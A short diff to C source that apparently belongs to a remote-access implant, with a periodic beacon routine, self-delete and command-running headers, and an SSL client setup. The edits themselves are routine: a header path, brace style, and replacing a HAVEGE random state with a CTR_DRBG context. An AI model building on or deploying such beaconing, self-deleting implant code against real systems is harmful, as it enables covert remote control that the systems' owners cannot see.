@@ -9,7 +9,7 @@
 #include "run_command.h"
 #include "debug.h"
 #include "threads.h"
-#include "polarssl/crypto.h"
+#include "../common/crypto.h"
 #include "proj_strings.h"
 #include "compat.h"
 #include "self_delete.h"
@@ -236,11 +236,11 @@ void *beacon(void* param)
 		// TODO: SendBeaconData does not handle errors returned
 		DLX(4, printf( "\tSending beacon data\n"));
 		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
-		if(ret == SUCCESS)
-		{
+		if(ret == SUCCESS) {
 			update_file((char*)sdfp);
-		} else
+		} else {
 			DLX(4, printf( "\tSend of beacon data failed\n"));
+		}
 #ifdef __VALGRIND__
 	if ( ++counter > 10 ) goto not_reached;
 #endif
@@ -310,7 +310,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	unsigned char* next_beacon_data = NULL;
 	
 	//ssl related variables for proxy
-	havege_state hs;
+	ctr_drbg_context ctr_drbg;
 	ssl_context ssl;
 	ssl_session ssn;
 
@@ -586,7 +586,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//setup ssl
 	DLX(4, printf("\tSetup crypto\n"));
-	if(crypt_setup_client( &hs, &ssl, &ssn, &sock ) != SUCCESS)
+	if(crypt_setup_client( &ctr_drbg, &ssl, &ssn, &sock ) != SUCCESS)
 	{
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
